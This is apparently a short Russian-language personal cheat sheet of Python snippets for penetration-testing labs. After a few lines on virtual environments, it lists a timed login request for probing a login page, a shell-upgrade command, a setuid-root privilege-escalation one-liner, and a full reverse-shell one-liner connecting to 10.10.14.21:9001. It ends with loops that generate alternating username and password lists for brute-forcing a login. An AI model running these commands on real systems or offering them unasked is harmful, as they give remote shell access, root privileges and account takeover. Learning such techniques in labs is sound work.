# Python

# Активировать виртуальную среду


python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt

pip3 install .

deactivate    (выход и окружения)

# Интерактивный режим

    python3 -i script.py

    import requests
    url = "http://10.10.11.135/login.php?login=true"
    # Отправка POST-запроса
    response = requests.post(url, data={'user':'admin','password':'pass'})
    print(response.elapsed.microseconds)

![Uploading image.png…]()


# получение виртуальной оболочки внутри текущей сессии линукс

    python3 -c 'import pty;pty.spawn("/bin/bash")'

    export TERM=xterm

# выполнение команд оси

./python3.8 -c “import os; os.setuid(0), os.system(‘/bin/sh’)”

# Reverse shell

    exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
# Разное
for i in range(150):
        if i % 3:
                print("carlos")
        else:
                print("wiener")


print("**************************************************************")
'''
with open('pass.txt', 'r') as f:
        lines = f.readlines()
i=0

for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i + 1
